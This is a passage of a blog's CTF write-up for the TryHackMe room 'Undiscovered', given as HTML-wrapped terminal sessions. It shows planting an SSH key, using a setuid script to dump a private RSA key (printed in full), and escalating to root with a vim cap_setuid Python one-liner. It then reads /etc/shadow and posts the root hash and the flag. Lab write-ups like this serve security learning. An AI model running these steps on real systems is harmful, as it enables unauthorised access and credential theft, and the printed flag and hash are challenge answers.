+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ mkdir authorized_keys
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ rm authorized_keys/
+</span></span></span><span class=line><span class=cl><span class=s1>rm: cannot remove &#39;</span>authorized_keys/<span class=s1>&#39;: Is a directory
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ rm -rf authorized_keys/
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub &gt; .ssh/authorized_keys
+</span></span></span><span class=line><span class=cl><span class=s1>bash: .ssh/authorized_keys: No such file or directory
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub &gt; authorized_keys
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.18.161
+</span></span></span><span class=line><span class=cl><span class=s1>^C
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.141.31
+</span></span></span><span class=line><span class=cl><span class=s1>Could not create directory &#39;</span>/home/william/.ssh<span class=s1>&#39;.
+</span></span></span><span class=line><span class=cl><span class=s1>The authenticity of host &#39;</span>10.10.141.31 <span class=o>(</span>10.10.141.31<span class=o>)</span><span class=s1>&#39; can&#39;</span>t be established.
+</span></span><span class=line><span class=cl>ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
+</span></span><span class=line><span class=cl>Are you sure you want to <span class=k>continue</span> connecting <span class=o>(</span>yes/no/<span class=o>[</span>fingerprint<span class=o>])</span>? yes
+</span></span><span class=line><span class=cl>Failed to add the host to the list of known hosts <span class=o>(</span>/home/william/.ssh/known_hosts<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 16.04.7 LTS <span class=o>(</span>GNU/Linux 4.4.0-189-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>0</span> packages can be updated.
+</span></span><span class=line><span class=cl><span class=m>0</span> updates are security updates.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Thu Sep <span class=m>10</span> 00:35:09 <span class=m>2020</span> from 192.168.0.147
+</span></span><span class=line><span class=cl>william@undiscovered:~$ cat admin.sh
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/sh</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[i] Start Admin Area!&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;[i] Make sure to keep this script safe from anyone else!&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>0</span>
+</span></span><span class=line><span class=cl>william@undiscovered:~$ ./script
+</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> Start Admin Area!
+</span></span><span class=line><span class=cl><span class=o>[</span>i<span class=o>]</span> Make sure to keep this script safe from anyone <span class=k>else</span>!
+</span></span><span class=line><span class=cl>william@undiscovered:~$ ./script <span class=nb>test</span>
+</span></span><span class=line><span class=cl>/bin/cat: /home/leonard/test: No such file or directory
+</span></span><span class=line><span class=cl>william@undiscovered:~$ ./script .ssh/id_rsa
+</span></span><span class=line><span class=cl>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span class=line><span class=cl>MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
+</span></span><span class=line><span class=cl>HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
+</span></span><span class=line><span class=cl>YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
+</span></span><span class=line><span class=cl>SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
+</span></span><span class=line><span class=cl>hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+</span></span><span class=line><span class=cl>+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
+</span></span><span class=line><span class=cl>C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+</span></span><span class=line><span class=cl>+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
+</span></span><span class=line><span class=cl>72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
+</span></span><span class=line><span class=cl>Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
+</span></span><span class=line><span class=cl>xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
+</span></span><span class=line><span class=cl>Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
+</span></span><span class=line><span class=cl>BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
+</span></span><span class=line><span class=cl>L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
+</span></span><span class=line><span class=cl>TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
+</span></span><span class=line><span class=cl>ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
+</span></span><span class=line><span class=cl>iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
+</span></span><span class=line><span class=cl>zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
+</span></span><span class=line><span class=cl>3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
+</span></span><span class=line><span class=cl>OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
+</span></span><span class=line><span class=cl>jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
+</span></span><span class=line><span class=cl>sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
+</span></span><span class=line><span class=cl>cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
+</span></span><span class=line><span class=cl>bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
+</span></span><span class=line><span class=cl>LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538<span class=o>=</span>
+</span></span><span class=line><span class=cl>-----END RSA PRIVATE KEY-----
+</span></span><span class=line><span class=cl>william@undiscovered:~$ ./script .ssh/id_rsa &gt; leonard
+</span></span><span class=line><span class=cl>william@undiscovered:~$ chmod <span class=m>600</span> leonard
+</span></span><span class=line><span class=cl>william@undiscovered:~$ ssh -i leonard leonard@undiscovered
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;undiscovered (127.0.1.1)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no)? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>undiscovered<span class=err>&#39;</span> <span class=o>(</span>ECDSA<span class=o>)</span> to the list of known hosts.
+</span></span><span class=line><span class=cl>Welcome to Ubuntu 16.04.7 LTS <span class=o>(</span>GNU/Linux 4.4.0-189-generic x86_64<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * Documentation:  https://help.ubuntu.com
+</span></span><span class=line><span class=cl> * Management:     https://landscape.canonical.com
+</span></span><span class=line><span class=cl> * Support:        https://ubuntu.com/advantage
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>0</span> packages can be updated.
+</span></span><span class=line><span class=cl><span class=m>0</span> updates are security updates.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Last login: Fri Sep  <span class=m>4</span> 22:57:43 <span class=m>2020</span> from 192.168.68.129
+</span></span><span class=line><span class=cl>leonard@undiscovered:~$ find / -type f -name <span class=s2>&#34;*vi*&#34;</span> -perm -4000 -ls 2&gt;/dev/null
+</span></span><span class=line><span class=cl>   <span class=m>390706</span>     <span class=m>12</span> -rwsr-xr-x   <span class=m>1</span> root     root        <span class=m>10232</span> Mar <span class=m>27</span>  <span class=m>2017</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>leonard@undiscovered:~$
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>leonard@undiscovered:~$ find / -type f -name &#34;*vi*&#34; -perm -4000 -ls 2&gt;/dev/null
+</span></span><span class=line><span class=cl>   390706     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+</span></span><span class=line><span class=cl>leonard@undiscovered:~$ getcap -r / 2&gt;/dev/null
+</span></span><span class=line><span class=cl>/usr/bin/mtr = cap_net_raw+ep
+</span></span><span class=line><span class=cl>/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+</span></span><span class=line><span class=cl>/usr/bin/traceroute6.iputils = cap_net_raw+ep
+</span></span><span class=line><span class=cl>/usr/bin/vim.basic = cap_setuid+ep
+</span></span><span class=line><span class=cl>leonard@undiscovered:~$ /usr/bin/vim.basic -c &#39;:py3 import os; os.setuid(0); os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-c&#34;, &#34;reset; exec sh&#34;)&#39;
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># id
+</span></span><span class=line><span class=cl>sh: 1: ot found
+</span></span><span class=line><span class=cl>sh: 1: 2Rid: not found
+</span></span><span class=line><span class=cl># cat /etc/shadow | grep -i root
+</span></span><span class=line><span class=cl>root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
+</span></span><span class=line><span class=cl>#
+</span></span></code></pre></td></tr></table></div></div><ol><li>user.txt</li></ol><p><code>THM{8d7b7299cccd1796a61915901d0e091c}</code></p><ol start=2><li>Whats the root user&rsquo;s password hash?</li></ol><p><code>root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::</code></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/tryhackme/>Tryhackme</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
